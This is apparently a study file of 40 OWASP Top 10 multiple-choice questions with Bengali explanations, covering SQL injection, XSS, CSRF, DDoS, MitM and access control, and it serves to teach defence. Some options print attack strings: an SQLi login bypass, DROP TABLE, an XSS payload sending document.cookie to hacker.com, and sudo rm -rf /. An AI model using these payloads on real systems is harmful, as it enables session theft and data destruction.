# 02. Common Vulnerabilities (Practice MCQs)

This file contains 40 in-depth MCQs covering the OWASP Top 10 vulnerabilities, specifically focusing on SQL Injection, XSS, CSRF, DDoS, Man-in-the-Middle (MitM) attacks, and their prevention techniques.

---

**Q1. What does OWASP stand for?**
A) Open Web Application Security Project (now known as Open Worldwide Application Security Project)
B) Online Web Access Security Protocol
C) Open Windows Application System Protection
D) Online Web Attack Simulation Program

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: A**
ব্যাখ্যা: OWASP হলো ওয়েব সিকিউরিটি নিয়ে কাজ করা সবচেয়ে বিখ্যাত নন-প্রফিট অর্গানাইজেশন।
</details>

---

**Q2. What is the "OWASP Top 10"?**
A) The top 10 best hackers in the world
B) A regularly-updated awareness document representing a broad consensus about the most critical security risks to web applications
C) The top 10 most secure programming languages
D) The top 10 antivirus software

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: এটি ওয়েবসাইটের সবচেয়ে ভয়ংকর ১০টি দুর্বলতার (Vulnerabilities) একটি লিস্ট, যা সফটওয়্যার ইঞ্জিনিয়ারদের অবশ্যই জানতে হয়।
</details>

---

**Q3. What is an SQL Injection (SQLi) attack?**
A) Injecting a virus into the RAM
B) A code injection technique that might destroy your database, where malicious SQL statements are inserted into entry fields for execution (e.g., to dump the database contents to the attacker).
C) Injecting JavaScript into the database
D) Speeding up SQL queries using a cache

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: ইউজার যখন টেক্সট বক্সে সাধারণ টেক্সটের বদলে ক্ষতিকর SQL কোড লিখে সাবমিট করে এবং ডাটাবেস সেটি রান করে ফেলে, তখন তাকে SQL ইনজেকশন বলে।
</details>

---

**Q4. Which of the following is a classic example of an SQL Injection payload intended to bypass authentication?**
A) `<script>alert(1)</script>`
B) `admin@test.com' OR '1'='1`
C) `DROP TABLE users;`
D) Both B and C

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: D**
ব্যাখ্যা: `OR '1'='1'` লিখে ডাটাবেসকে বোকা বানিয়ে পাসওয়ার্ড ছাড়াই লগইন করা যায়। আবার `DROP TABLE` লিখে পুরো ডাটাবেস ডিলিট করে দেওয়া যায়।
</details>

---

**Q5. What is the fundamental cause of an SQL Injection vulnerability in a web application?**
A) Using MySQL instead of PostgreSQL
B) Using string concatenation to directly combine untrusted user input with the SQL query string before sending it to the database
C) Not using an antivirus on the server
D) Running the database on Port 3306

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: আমরা যখন ইউজার ইনপুটকে সরাসরি স্ট্রিং কনক্যাটেনেশন (`+` সাইন) করে SQL কোয়েরির ভেতরে বসিয়ে দিই, তখনই এই দুর্বলতা তৈরি হয়।
</details>

---

**Q6. What is the most effective and primary defense against SQL Injection?**
A) Using a firewall
B) Using Prepared Statements (Parameterized Queries) for all database access
C) Encrypting the passwords
D) Hiding the database IP address

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: Prepared Statement ব্যবহার করলে ডাটাবেস ইউজার ইনপুটকে 'আসল কমান্ড' হিসেবে রান না করে 'সাধারণ টেক্সট' হিসেবে ধরে নেয়। ফলে SQL ইনজেকশন ১০০% ঠেকানো যায়।
</details>

---

**Q7. How do Prepared Statements (Parameterized Queries) prevent SQL Injection?**
A) They encrypt the query
B) They pre-compile the SQL statement structure separately from the user data parameters. When the parameters are inserted later, the database treats them strictly as data/strings, NOT as executable SQL code.
C) They block IP addresses of hackers
D) They convert SQL to NoSQL

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: Prepared Statement কোয়েরি এবং ডেটাকে আলাদাভাবে ডাটাবেসে পাঠায়। তাই হ্যাকার যদি ডেটার জায়গায় SQL কোডও লিখে দেয়, ডাটাবেস সেটাকে শুধু স্ট্রিং হিসেবেই ট্রিট করবে, রান করবে না।
</details>

---

**Q8. What does XSS stand for?**
A) Cross-Site Scripting
B) Extreme Secure Sockets
C) Cross-Server Security
D) eXtra Site Scripting

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: A**
ব্যাখ্যা: XSS (Cross-Site Scripting) হলো ব্রাউজারের একটি ভয়ংকর দুর্বলতা। CSS (Cascading Style Sheets) এর সাথে নাম মিলে যায় বলে একে CSS না বলে XSS বলা হয়।
</details>

---

**Q9. What happens in a typical XSS (Cross-Site Scripting) attack?**
A) The attacker deletes the database
B) The attacker injects malicious client-side scripts (usually JavaScript) into web pages viewed by other users. When the victim's browser loads the page, it unknowingly executes the malicious script.
C) The attacker changes the server's IP address
D) The attacker cracks the Wi-Fi password

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: হ্যাকার ওয়েবসাইটের (যেমন কমেন্ট বক্সে) ক্ষতিকর জাভাস্ক্রিপ্ট ঢুকিয়ে দেয়। অন্য ইউজাররা সেই পেজে গেলে তাদের ব্রাউজারে ওই কোডটি অটোমেটিক রান হয়ে যায়।
</details>

---

**Q10. What is a common objective of an XSS attack?**
A) To make the website load faster
B) To steal the victim's Session Cookies, allowing the attacker to hijack their session and log in as the victim without needing a password
C) To delete files on the server's hard drive
D) To upgrade the user's browser

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: XSS এর মূল উদ্দেশ্যই থাকে ইউজারের ব্রাউজার থেকে তার সেশন কুকি (Session Cookie) চুরি করা, যাতে হ্যাকার তার অ্যাকাউন্টে ঢুকে যেতে পারে।
</details>

---

**Q11. Which of the following is a classic example of an XSS payload?**
A) `SELECT * FROM users;`
B) `<script>fetch('http://hacker.com/steal?cookie=' + document.cookie)</script>`
C) `192.168.1.1`
D) `sudo rm -rf /`

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: হ্যাকার `<script>` ট্যাগের ভেতরে কোড লিখে দেয়। ব্রাউজার इसे সাধারণ টেক্সট না ভেবে জাভাস্ক্রিপ্ট কোড ভেবে রান করে ফেলে এবং কুকি হ্যাকারের লিংকে পাঠিয়ে দেয়।
</details>

---

**Q12. What are the three main types of XSS?**
A) Alpha, Beta, Gamma
B) Stored XSS, Reflected XSS, and DOM-based XSS
C) Database XSS, Server XSS, Network XSS
D) Basic, Intermediate, Advanced

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: Stored (ডাটাবেসে সেভ হয়ে থাকে), Reflected (URL এর মাধ্যমে আসে), এবং DOM-based (ব্রাউজারের DOM ম্যানিপুলেট করে)।
</details>

---

**Q13. In "Stored XSS", where does the malicious payload reside?**
A) On the attacker's computer only
B) It is permanently saved on the target application's server (e.g., in a database as a forum post or comment) and is served to any user who views that content.
C) In the URL parameters
D) In the Wi-Fi router

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: হ্যাকার কমেন্ট বক্সে স্ক্রিপ্ট লিখে কমেন্ট করে দেয়, যা ডাটাবেসে সেভ (Stored) হয়ে যায়। এরপর যত মানুষ ওই কমেন্টটি দেখবে, সবার ব্রাউজার হ্যাক হবে।
</details>

---

**Q14. What is the primary defense against XSS attacks?**
A) Buying a better router
B) Input Validation and Output Encoding (Escaping). Converting special characters like `<` and `>` into HTML entities like `&lt;` and `&gt;` before rendering them in the browser.
C) Encrypting the database
D) Disabling JavaScript completely in the server

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: ইউজারের ইনপুটকে ব্রাউজারে দেখানোর আগে Escaping (বা Sanitization) করতে হয়। অর্থাৎ `<` কে `&lt;` বানিয়ে দিলে ব্রাউজার আর এটিকে ট্যাগ হিসেবে চিনতে পারে না, শুধু টেক্সট হিসেবে দেখায়।
</details>

---

**Q15. How do modern frontend frameworks like React, Angular, and Vue help with XSS?**
A) They don't help at all
B) They automatically perform context-aware output encoding (escaping) by default when rendering variables, making most XSS attacks fail unless the developer explicitly bypasses it (e.g., using `dangerouslySetInnerHTML`).
C) They block IP addresses
D) They disable the internet

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: React বা Vue তে আপনি ভেরিয়েবল প্রিন্ট করলে তারা অটোমেটিক্যালি সেগুলোকে এস্কেপ (Escape) করে দেয়। তাই এসব ফ্রেমওয়ার্কে XSS অ্যাটাক হওয়া বেশ কঠিন।
</details>

---

**Q16. What is a "HttpOnly" cookie?**
A) A cookie that only works on HTTP, not HTTPS
B) A security flag added to a cookie that instructs the browser to NEVER allow client-side scripts (like JavaScript) to access the cookie. This effectively prevents XSS payloads from stealing session cookies via `document.cookie`.
C) A cookie that stores HTML
D) A cookie without sugar

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: সেশন কুকি সেভ করার সময় যদি `HttpOnly` ফ্ল্যাগ সেট করে দেওয়া হয়, তবে জাভাস্ক্রিপ্ট কোড দিয়ে (XSS অ্যাটাক করে) আর সেই কুকি পড়া যায় না। এটি XSS এর বিরুদ্ধে চমৎকার একটি ডিফেন্স।
</details>

---

**Q17. What does CSRF stand for?**
A) Cross-Server Router Forwarding
B) Cross-Site Request Forgery
C) Cascading Style Rendering Format
D) Client-Side Request Failure

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: CSRF (Cross-Site Request Forgery) হলো এমন একটি অ্যাটাক যেখানে হ্যাকার ইউজারের অজান্তে অন্য সাইট থেকে তার নামে ফেক রিকোয়েস্ট পাঠায়।
</details>

---

**Q18. How does a CSRF (Cross-Site Request Forgery) attack work?**
A) By guessing passwords
B) The attacker tricks an authenticated user into visiting a malicious site, which then automatically sends a forged state-changing request (like transferring money) to a vulnerable site where the user is currently logged in. The browser automatically includes the user's session cookies.
C) By dropping database tables
D) By crashing the server

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: আপনি ব্যাংকে লগইন করা আছেন। হ্যাকার আপনাকে একটি লিংকে ক্লিক করালো। ওই লিংকের ভেতরে থাকা কোড আপনার ব্রাউজারকে দিয়ে জোর করে ব্যাংকে টাকা পাঠানোর রিকোয়েস্ট (POST) করিয়ে নিলো। ব্রাউজার অটোমেটিক আপনার কুকি পাঠিয়ে দিল, ব্যাংক ভাবল আপনিই রিকোয়েস্ট করেছেন!
</details>

---

**Q19. What is the fundamental difference between XSS and CSRF?**
A) They are the same thing
B) XSS exploits the user's trust in a vulnerable website (to run bad code). CSRF exploits a vulnerable website's trust in a user's browser (because the browser automatically sends cookies).
C) XSS is for databases, CSRF is for frontend
D) CSRF is legal

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: XSS এ হ্যাকার সাইটের দুর্বলতা দিয়ে ইউজারের ব্রাউজারে কোড রান করায়। আর CSRF এ ব্রাউজারের অটোমেটিক কুকি পাঠানোর ফায়দা নিয়ে সাইটকে ধোঁকা দেয়।
</details>

---

**Q20. What is the most common and effective defense against CSRF attacks?**
A) Turning off the monitor
B) Using Anti-CSRF Tokens (Synchronizer Token Pattern). A unique, unpredictable, server-generated token is added as a hidden field in forms. The attacker cannot forge the request because they do not know the secret token.
C) Encrypting the HTML
D) Disabling cookies entirely

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: ফর্ম সাবমিট করার সময় একটি সিক্রেট টোকেন (Anti-CSRF Token) পাঠাতে হয়, যা শুধু অরিজিনাল ওয়েবসাইটটি জানে। হ্যাকারের সাইট ওই টোকেন জানে না, তাই তার রিকোয়েস্ট ব্যাংক রিজেক্ট করে দেয়।
</details>

---

**Q21. How does the `SameSite` cookie attribute help prevent CSRF?**
A) It makes all sites look the same
B) By setting `SameSite=Strict` or `Lax`, the browser is instructed NOT to send cookies along with cross-site requests (requests originating from a different domain like hacker.com).
C) It deletes cookies every minute
D) It converts cookies to JSON

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: `SameSite` অ্যাট্রিবিউট বলে দেয় যে, অন্য কোনো ডোমেইন থেকে রিকোয়েস্ট আসলে ব্রাউজার যেন তার সাথে কুকি না পাঠায়। এতে CSRF অ্যাটাক পুরোপুরি ব্লক হয়ে যায়।
</details>

---

**Q22. What does DDoS stand for?**
A) Direct Data Oriented System
B) Distributed Denial of Service
C) Domain Directory Operation Standard
D) Digital Denial of Security

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: DDoS মানে হলো অনেকগুলো জায়গা থেকে একসাথে আক্রমণ করে সার্ভারকে ডাউন করে দেওয়া (Denial of Service)।
</details>

---

**Q23. How is a DDoS attack typically executed?**
A) By sending one very large email
B) An attacker uses a "Botnet" (a massive network of compromised computers or IoT devices) to flood a target server with an overwhelming amount of fake internet traffic, causing it to slow down or crash, denying service to legitimate users.
C) By guessing the admin password
D) By stealing hard drives

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: হ্যাকার হাজার হাজার পিসি হ্যাক করে (Botnet) সেগুলো দিয়ে একসাথে টার্গেট সার্ভারে লাখ লাখ ফেক রিকোয়েস্ট পাঠায়। ফলে সার্ভারের র‍্যাম/সিপিইউ ফুল হয়ে সাইট ডাউন হয়ে যায়।
</details>

---

**Q24. Can a DDoS attack be completely prevented by writing better Java/Node.js code?**
A) Yes, using try-catch blocks
B) No. Code cannot stop the massive volume of network traffic clogging the physical network pipes. It requires infrastructure-level defenses like CDNs (e.g., Cloudflare), Web Application Firewalls (WAF), and Rate Limiting.
C) Yes, by using Spring Boot
D) Yes, by compressing images

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: DDoS ঠেকানো ডেভেলপারের কোডের কাজ নয়। ট্রাফিক এত বেশি আসে যে সার্ভার পর্যন্ত পৌঁছানোর আগেই নেটওয়ার্ক জ্যাম হয়ে যায়। এটি ঠেকাতে Cloudflare বা WAF এর মতো ইনফ্রাস্ট্রাকচার লেভেলের সিকিউরিটি লাগে।
</details>

---

**Q25. What is a "Man-in-the-Middle" (MitM) attack?**
A) A referee in a football match
B) An attacker secretly intercepts, relays, and possibly alters the communication between two parties who believe they are directly communicating with each other (e.g., intercepting traffic on a public Wi-Fi).
C) A load balancer
D) A proxy server

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: পাবলিক ওয়াইফাই হ্যাক করে হ্যাকার যখন আপনার এবং ব্যাংকের মাঝখানে বসে পড়ে, এবং আপনাদের সব কথাবার্তা (মেসেজ, পাসওয়ার্ড) গোপনে শুনতে থাকে বা চেঞ্জ করে দেয়, তাকেই Man-in-the-Middle (MitM) অ্যাটাক বলে।
</details>

---

**Q26. What is the absolute best defense against Man-in-the-Middle (MitM) attacks on the web?**
A) Using a VPN
B) Enforcing HTTPS (TLS/SSL) everywhere. The encryption ensures that even if the attacker intercepts the traffic, they only see unreadable ciphertext, and digital certificates verify the server's identity.
C) Using incognito mode
D) Hiding the IP address

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: HTTPS ইউজ করলে আপনার ব্রাউজার এবং সার্ভারের মাঝখানের পুরো রাস্তাটি এনক্রিপ্টেড (লক করা) থাকে। হ্যাকার মাঝখানে বসে ডেটা চুরি করলেও শুধু হাবিজাবি (Ciphertext) দেখবে, কিছুই বুঝতে পারবে না।
</details>

---

**Q27. What is "Rate Limiting"?**
A) Limiting the CPU clock speed
B) A defensive technique that restricts the number of requests a user (or IP address) can make to an API or server within a specific timeframe (e.g., 100 requests per minute) to prevent brute-force and minor DoS attacks.
C) Limiting the database size
D) Limiting the video resolution

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: রেট লিমিট মানে হলো লিমিট সেট করে দেওয়া। যেমন এক IP থেকে ১ মিনিটে ১০০ টার বেশি রিকোয়েস্ট আসলে তাকে ব্লক করে দেওয়া হবে। এটি ব্রুট-ফোর্স এবং স্প্যামিং ঠেকাতে দারুণ কাজ করে।
</details>

---

**Q28. What does "CORS" stand for?**
A) Cross-Origin Resource Sharing
B) Cross-Over Router System
C) Centralized Online Remote Server
D) Cascading Object Rendering Style

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: A**
ব্যাখ্যা: CORS হলো ব্রাউজারের একটি সিকিউরিটি মেকানিজম, যা এক ডোমেইন থেকে অন্য ডোমেইনে (Cross-Origin) API কল করা কন্ট্রোল করে।
</details>

---

**Q29. Is CORS primarily a security mechanism to protect the Server or the User's Browser?**
A) The Server
B) The User's Browser. It prevents malicious scripts on one website from reading sensitive data from another website's API using the user's authenticated session.
C) The Database
D) The Router

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: CORS আসলে সার্ভারকে প্রটেক্ট করে না, এটি ইউজারের ব্রাউজারকে প্রটেক্ট করে। যাতে হ্যাকারের সাইট (A) থেকে আপনার ব্যাংকের সাইটের (B) API কল করে কেউ ডেটা চুরি করতে না পারে।
</details>

---

**Q30. Which OWASP Top 10 category involves attackers gaining access to admin panels or other users' data by manipulating parameters like User IDs in the URL (e.g., `id=5` to `id=6`)?**
A) Broken Access Control (specifically Insecure Direct Object References - IDOR)
B) Cryptographic Failures
C) Security Misconfiguration
D) Software and Data Integrity Failures

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: A**
ব্যাখ্যা: লিংকের শেষে `user_id=10` কে চেঞ্জ করে `user_id=11` করে দিলে যদি অন্য ইউজারের ডেটা দেখা যায় (সার্ভার যদি চেক না করে যে এই ডেটা দেখার পারমিশন আপনার আছে কি না), তবে তাকে Broken Access Control বা IDOR বলে। এটি বর্তমানে OWASP লিস্টের ১ নাম্বারে আছে!
</details>

---

**Q31. How do you prevent Broken Access Control (IDOR)?**
A) By hiding the URL
B) By implementing robust Authorization checks on the server-side for EVERY request, verifying that the currently logged-in user actually has permission to access the requested resource.
C) By using MD5
D) By disabling JavaScript

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: সার্ভারে প্রতিবার API কল হওয়ার সময় চেক (Authorize) করতে হবে যে, যে ইউজার কলটি করেছে, এই স্পেসিফিক ডেটাটি দেখার বা এডিট করার পারমিশন তার আছে কি না। শুধু লগইন করা থাকলেই হবে না।
</details>

---

**Q32. What is "Social Engineering"?**
A) Building social media apps
B) Psychological manipulation of people into performing actions or divulging confidential information (e.g., Phishing emails pretending to be a bank to steal passwords).
C) Writing code for NGOs
D) Managing server communities

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: হ্যাকাররা সিস্টেম হ্যাক না করে যখন মানুষকে বোকা বানিয়ে (যেমন লটারির মেসেজ বা ফেক ইমেইল দিয়ে) পাসওয়ার্ড হাতিয়ে নেয়, তাকে সোশ্যাল ইঞ্জিনিয়ারিং বা ফিশিং (Phishing) বলে। এটি সবচেয়ে বেশি ঘটে!
</details>

---

**Q33. What is a "Zero-Day Vulnerability"?**
A) A bug that takes zero days to fix
B) A software vulnerability that is completely unknown to the vendor/developer and the public, meaning there is "zero days" of protection or patch available when hackers start exploiting it.
C) A bug that happens at midnight
D) A vulnerability in older software

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: সফটওয়্যারের এমন একটি দুর্বলতা যা হ্যাকাররা খুঁজে পেয়েছে, কিন্তু সফটওয়্যার কোম্পানি এখনো জানেই না! কোম্পানি জানার আগে (Zero day) হ্যাকাররা যে অ্যাটাক করে তাকেই Zero-Day Attack বলে।
</details>

---

**Q34. Which HTTP header helps protect against clickjacking attacks by preventing a site from being framed inside an `<iframe>` on another site?**
A) `Content-Type`
B) `X-Frame-Options` (or Content-Security-Policy: frame-ancestors)
C) `Authorization`
D) `User-Agent`

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: হ্যাকাররা অনেক সময় আপনার সাইটকে তাদের সাইটের ভেতরে `<iframe>` এ ঢুকিয়ে রাখে (Clickjacking)। `X-Frame-Options: DENY` দিলে আপনার সাইটকে কেউ আইফ্রেমে লোড করতে পারবে না।
</details>

---

**Q35. What is the principle of "Least Privilege"?**
A) Paying employees the least amount possible
B) A security concept where a user, program, or process is only granted the bare minimum permissions necessary to perform its required task, and nothing more.
C) Running the OS on minimal RAM
D) Using the shortest passwords

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: যার যতটুকু পারমিশন দরকার, ঠিক ততটুকুই তাকে দেওয়া। ডাটাবেস অ্যাডমিনকে পুরো সার্ভারের অ্যাক্সেস না দিয়ে শুধু ডাটাবেসের অ্যাক্সেস দেওয়া। এতে কেউ হ্যাক হলেও ক্ষতি কম হবে।
</details>

---

**Q36. What does "Security Misconfiguration" typically refer to in the OWASP Top 10?**
A) Writing bad Java code
B) Failing to properly configure security settings at any layer (e.g., leaving default passwords like admin/admin, enabling directory listing, exposing debug stack traces to users in production).
C) Forgetting to save files
D) Using an old keyboard

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: কোড ঠিক আছে, কিন্তু সার্ভারের সেটিংসে ভুল করা। যেমন: রাউটারের ডিফল্ট পাসওয়ার্ড চেঞ্জ না করা, বা প্রডাকশন সাইটে এররের লাল স্ক্রিন (Stack trace) ইউজারকে দেখিয়ে দেওয়া (যেখানে কোডের লাইন দেখা যায়)।
</details>

---

**Q37. What is "Cryptographic Failure" (formerly Sensitive Data Exposure)?**
A) When a crypto coin crashes
B) Failing to properly protect sensitive data in transit (not using HTTPS) or at rest (storing passwords as plain text or using weak/broken algorithms like MD5).
C) Losing a USB drive
D) Forgetting an SSH key

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: ইউজারের সিক্রেট ডেটা (পাসওয়ার্ড, ক্রেডিট কার্ড) প্লেইন টেক্সটে সেভ করা বা পুরনো MD5 অ্যালগরিদম ইউজ করাকে Cryptographic Failure বলে।
</details>

---

**Q38. Why is it dangerous to construct dynamic SQL queries using String concatenation instead of Prepared Statements?**
A) It is slightly slower
B) It allows an attacker to manipulate the SQL syntax and logic by injecting their own SQL commands, leading to an SQL Injection attack.
C) It uses too much RAM
D) The syntax is too hard to read

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: `+` দিয়ে স্ট্রিং জোড়া লাগালে হ্যাকার তার ইনপুটের মধ্যে SQL কমান্ড লিখে দিলে ডাটাবেস তাকে আসল কমান্ড ভেবে রান করে ফেলে।
</details>

---

**Q39. What is a Web Application Firewall (WAF)?**
A) A physical wall in a data center
B) A security system placed in front of a web application that analyzes incoming HTTP traffic and filters out malicious requests like SQLi, XSS, and bot traffic before they reach the server.
C) A browser extension
D) An antivirus for Mac

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: WAF হলো সার্ভারের সামনের একজন দারোয়ান। সে ইনকামিং ট্রাফিক চেক করে। যদি দেখে কেউ SQLi বা XSS এর ক্ষতিকর কোড পাঠাচ্ছে, তবে সে তাকে সার্ভার পর্যন্ত ঢুকতেই দেয় না, ওখান থেকেই ব্লক করে দেয়।
</details>

---

**Q40. [Conclusion] Why is security NOT something you can just "add at the end" of software development?**
A) Because it costs too much money
B) Because security flaws are often deeply embedded in the application's architecture and core logic (e.g., Broken Access Control). Security must be a primary consideration throughout the entire Software Development Life Cycle (Shift-Left approach).
C) Because clients don't care
D) Because the OS handles it automatically

<details>
<summary>✅ Answer & Explanation</summary>

**Answer: B**
ব্যাখ্যা: সিকিউরিটি কোনো প্লাগিন না যে লাস্টে অ্যাড করে দেবেন। অ্যাপের আর্কিটেকচার বা ডিজাইনে ভুল থাকলে পরে তা ঠিক করা প্রায় অসম্ভব। তাই শুরু থেকেই (Shift-Left) সিকিউরিটির কথা মাথায় রেখে কোড করতে হয়।
</details>
